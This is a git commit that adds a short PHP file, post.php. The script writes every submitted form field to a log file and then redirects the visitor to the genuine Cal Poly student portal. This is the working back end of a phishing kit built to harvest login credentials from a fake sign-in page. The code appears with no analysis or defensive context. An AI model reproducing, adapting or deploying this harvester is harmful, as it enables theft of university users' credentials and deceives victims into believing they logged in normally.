8630704f249e6c9d82b5271f9c9933aefada5e01
Kraetiv <55904876+Kraetiv@users.noreply.github.com>
2019-10-31 13:40:24 -0700

    Create post.php

---
+++ post.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location: https://myportal.calpoly.edu/f/u17l1s6/normal/render.uP');
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n\n\n\n");
+fclose($handle);
+exit;
+?>
